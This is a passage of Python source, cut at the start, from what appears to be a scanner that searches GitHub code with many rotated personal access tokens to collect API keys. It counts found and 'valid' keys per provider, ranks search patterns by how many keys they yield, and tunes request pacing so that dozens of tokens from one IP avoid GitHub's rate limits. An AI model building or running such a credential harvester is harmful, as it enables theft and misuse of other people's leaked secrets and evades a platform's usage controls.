            # entire cycle hostage; with the shared queue + abandon pattern
            # one burned token only loses its own throughput, not everyone's.
            if 0 <= core_q < 200:
                core_reset = _TOKEN_STATUS.get(tk, {}).get("core_reset", 0)
                now        = int(datetime.now(timezone.utc).timestamp())
                eta        = (core_reset - now) if core_reset else 120
                if eta > 300:
                    log.warning(
                        "[w%d] core exhausted (reset %ds away — too long); "
                        "worker exits, others continue draining queue",
                        worker_id, eta,
                    )
                    return
                wait = max(min(eta, _PRIMARY_WAIT_CAP), 60)
                log.warning("[w%d] core quota low (%d remaining), sleeping %ds until reset",
                            worker_id, core_q, wait)
                await asyncio.sleep(wait + random.uniform(0, 30))

        for page in range(1, MAX_PAGES + 1):
            try:
                items = await search_code(client, query_str, page, hdrs)
            except Exception as e:
                log.error("[w%d] search err: %s", worker_id, e)
                break

            if not items:
                break

            items_returned_total += len(items)
            tasks = [
                asyncio.create_task(
                    process_item(client, item, provider, file_type, sem, hdrs)
                )
                for item in items
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for exc in results:
                if isinstance(exc, Exception):
                    log.debug("[w%d] item err: %s", worker_id, exc)

            if len(items) < 100:
                break

            await asyncio.sleep(SCAN_PAGE_SLEEP_SEC)  # between pages — secondary rate-limit buffer

        # Yield-tracking: only for dynamic queries (those with a hash).
        # Δ-based attribution is approximate (other workers may insert keys
        # concurrently) but biased correctly over time — patterns that return
        # 0 items consistently will eventually accumulate to dead-pattern
        # blacklist threshold (5+ uses, 0 keys_found).
        if query_hash:
            try:
                stats_after = db.get_stats()
                k_delta = max(0, stats_after.get("keys_found", 0) - keys_found_before)
                v_delta = max(0, stats_after.get("keys_valid", 0) - valid_found_before)
                # Cross-attribution noise: clamp to plausible per-query range.
                # 9 workers running in parallel — divide deltas by N as a
                # rough heuristic to avoid over-attributing concurrent finds.
                n_workers = max(1, len(GITHUB_TOKENS))
                k_attr = k_delta // n_workers
                v_attr = v_delta // n_workers
                db.record_query_usage(
                    query_hash,
                    items_returned=items_returned_total,
                    keys_found=k_attr,
                    valid_keys_found=v_attr,
                )
            except Exception as e:
                log.debug("[w%d] yield-track err for %s: %s",
                          worker_id, query_hash[:12], e)

        queries_done += 1
        # Inter-query throttle. Per-token search budget is 30 req/min ⇒ 2s/req
        # IS THE LIMIT. 30 PATs from a single Railway IP = server treats them
        # as one source for SECONDARY rate limit (429). Lowering this to 1s
        # at 30 workers caused a 429 storm (1800 q/min from 1 IP). Keep at 2s.
        await asyncio.sleep(2)


# ── Main cycle ─────────────────────────────────────────────────────────────

async def run_cycle():
    n = len(GITHUB_TOKENS)
    # Yield-priority selection — caps the cycle at SCAN_MAX_QUERIES_PER_CYCLE
    # so we don't drown in secondary 429s. Always includes all static QUERIES
    # + dynamic yielders + newcomers; samples long-tail.
    all_queries = select_queries_for_cycle()
    static_n  = sum(1 for q in all_queries if len(q) == 4 and q[3] is None)
    dynamic_n = len(all_queries) - static_n

    # Shared work queue — workers pull on-demand instead of having an
    # exclusive static slice. If one worker's token burns (primary 403, distant
    # reset), it returns and the OTHER 14 workers keep draining. Static
    # partitioning held the entire cycle hostage on the slowest token because
    # asyncio.gather() waits for every worker.
    queue: asyncio.Queue = asyncio.Queue()
    for q in all_queries:
        queue.put_nowait(q)

    log.info(
        "=== scan cycle start | %d tokens | %d queries (%d static + %d dynamic) | "
        "%d concurrent items | max %d pages | cross-extract: %d infra providers ===",
        n, len(all_queries), static_n, dynamic_n,
        CONCURRENT_ITEMS, MAX_PAGES, len(INFRA_EXTRACTORS),
    )

    sem = asyncio.Semaphore(CONCURRENT_ITEMS)

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS) as client:
        workers = [
            asyncio.create_task(_run_worker(client, queue, GITHUB_TOKENS[i], sem, i))
            for i in range(n)
        ]
        results = await asyncio.gather(*workers, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                log.error("worker crashed: %s", r)
        remaining = queue.qsize()
        if remaining:
            log.warning("scan cycle done — %d queries left in queue (all workers exited early; "
                        "likely most tokens hit primary 403). Will be retried next cycle.",
                        remaining)

    stats = db.get_stats()
    log.info("=== cycle done: %s ===", stats)
    await notify_cycle_done(stats)
